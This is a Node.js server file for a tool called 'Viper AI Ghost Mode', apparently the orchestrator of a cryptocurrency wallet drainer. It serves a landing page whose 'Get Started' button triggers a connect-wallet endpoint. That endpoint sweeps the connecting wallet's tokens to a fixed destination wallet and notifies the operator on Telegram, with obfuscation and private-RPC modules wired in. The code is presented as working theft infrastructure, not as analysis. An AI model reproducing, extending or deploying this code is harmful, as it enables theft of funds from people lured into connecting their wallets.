/**
 * MASTER MAIN.JS - Ghost Mode Orchestrator
 * Connects all modules and triggers sweep on wallet connection
 */

require('dotenv').config();

const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');

// Core modules
const GhostMode = require('./src/core/ghostMode');
const walletSync = require('./src/core/walletSync');
const TransactionBuilder = require('./src/core/transactionBuilder');

// Services
const tokenDiscovery = require('./src/services/tokenDiscovery');
const jitoBundler = require('./src/services/jitoBundler');
const priorityFees = require('./src/services/priorityFees');
const lutBatching = require('./src/services/lutBatching');
const gasCalculator = require('./src/services/gasCalculator');
const obfuscation = require('./src/services/obfuscation');

// Network
const SocketListener = require('./src/network/socketListener');
const privateRPC = require('./src/network/privateRPC');
const errorHandler = require('./src/network/errorHandler');

// Bot
const telegramBot = require('./src/bot/telegramBot');

// Utils
const logger = require('./utils/logger');
const helpers = require('./utils/helpers');

// Constants
const { DESTINATION_WALLET, TELEGRAM_USER_ID, SETTINGS } = require('./config/constants');

// ==================== SERVER SETUP ====================
const app = express();
const server = http.createServer(app);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ==================== INITIALIZE SOCKET LISTENER ====================
const socketListener = new SocketListener(server);

// ==================== API ENDPOINTS ====================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: Date.now(),
    ghostMode: 'active',
    wallets: walletSync.getActiveWallets().length
  });
});

// Get active wallets
app.get('/api/wallets', (req, res) => {
  res.json({
    count: walletSync.getActiveWallets().length,
    wallets: walletSync.getActiveWallets()
  });
});

// Manually trigger sweep for wallet
app.post('/api/sweep', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress) {
      return res.status(400).json({ error: 'walletAddress required' });
    }

    logger.info(`Manual sweep triggered for ${walletAddress.slice(0, 8)}...`);
    
    const result = await walletSync.onWalletConnected(walletAddress, 'api');
    
    res.json({
      success: true,
      message: 'Ghost mode activated',
      ...result
    });
  } catch (error) {
    logger.error('Manual sweep failed:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get sweep statistics
app.get('/api/stats', (req, res) => {
  res.json({
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    connections: socketListener.getStats(),
    settings: SETTINGS,
    destination: DESTINATION_WALLET.toBase58()
  });
});

// ==================== BRIDGE ENDPOINT FOR HTML BUTTON ====================
app.post('/api/connect-wallet', async (req, res) => {
  // This endpoint is called from index.html when user clicks "Get Started"
  // It simulates a wallet connection to trigger ghost mode
  try {
    const { walletAddress } = req.body;
    
    // If no address provided, use a test one (in production, this comes from Phantom)
    const address = walletAddress || 'DEMO_WALLET_' + Date.now();
    
    logger.info(`Bridge: Wallet connect triggered for ${address.slice(0, 8)}...`);
    
    // Trigger ghost mode
    const result = await walletSync.onWalletConnected(address, 'bridge');
    
    // Notify Telegram
    await telegramBot.sendAlert(
      TELEGRAM_USER_ID,
      `🎯 Wallet connected via website\nAddress: ${address.slice(0, 8)}...\nGhost Mode activated`
    );

    res.json({
      success: true,
      message: 'Ghost mode initiated',
      ...result
    });
  } catch (error) {
    logger.error('Bridge error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ==================== SERVE INDEX.HTML ====================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;

// 🔥 FIX: Add '0.0.0.0' to bind to all network interfaces
server.listen(PORT, '0.0.0.0', () => {
  logger.success(`=================================`);
  logger.success(`🐍 VIPER AI GHOST MODE ACTIVE`);
  logger.success(`=================================`);
  // 🔥 FIX: Change localhost to 0.0.0.0 in log
  logger.info(`Server: http://0.0.0.0:${PORT}`);
  logger.info(`Destination: ${DESTINATION_WALLET.toBase58().slice(0, 8)}...`);
  logger.info(`Telegram Bot: Active`);
  logger.info(`Jito Bundles: Enabled`);
  logger.info(`LUT Batching: Enabled`);
  logger.info(`=================================`);
  
  // Send startup notification
  telegramBot.sendAlert(
    TELEGRAM_USER_ID,
    `🚀 Viper AI Ghost Mode Started\n` +
    `Destination: ${DESTINATION_WALLET.toBase58().slice(0, 8)}...\n` +
    `Wallets will auto-sweep on connection`
  ).catch(() => {});
});

// ==================== GRACEFUL SHUTDOWN ====================
process.on('SIGINT', async () => {
  logger.info('Shutting down...');
  
  await telegramBot.sendAlert(
    TELEGRAM_USER_ID,
    '🛑 Viper AI shutting down'
  ).catch(() => {});
  
  process.exit(0);
});

module.exports = { app, server, socketListener, walletSync };